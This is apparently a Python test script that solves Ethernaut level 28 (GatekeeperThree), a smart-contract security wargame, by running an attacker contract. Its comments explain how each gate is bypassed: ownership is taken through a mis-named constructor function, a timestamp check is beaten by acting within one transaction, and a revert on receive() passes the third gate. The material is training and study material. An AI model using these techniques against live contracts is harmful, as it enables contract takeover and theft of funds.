from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv28_gatekeeper_three import GatekeeperThree, SimpleTrick
from pytypes.contracts.attacker.lv28_gatekeeper_three_attacker import GatekeeperThreeAttacker

@default_chain.connect()
def test_lv28():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv28()
    exploit_lv28(contract)
    ethernaut.check_lv28(contract)

def exploit_lv28(contract: GatekeeperThree):
    # first deploy an attacker contract
    # we need a separate contract so that msg.sender != tx.origin 
    # is not the same (see gate 1)
    attacker = GatekeeperThreeAttacker.deploy(contract)

    # to bypass gate 1, attacker calls the construct0r() function,
    # which is disguised as a constructor, however anyone can 
    # call it and become the owner
    attacker.bypassGate1()

    # to bypass gate 2, we call createTrick() and getAllowance()
    # in the same tx, that way we know exactly the value of block.timestamp
    attacker.bypassGate2()

    # to bypass gate 3, we must send some ether to the contract 
    # and revert on receive()
    attacker.bypassGate3(value=10**18)

    attacker.enter()
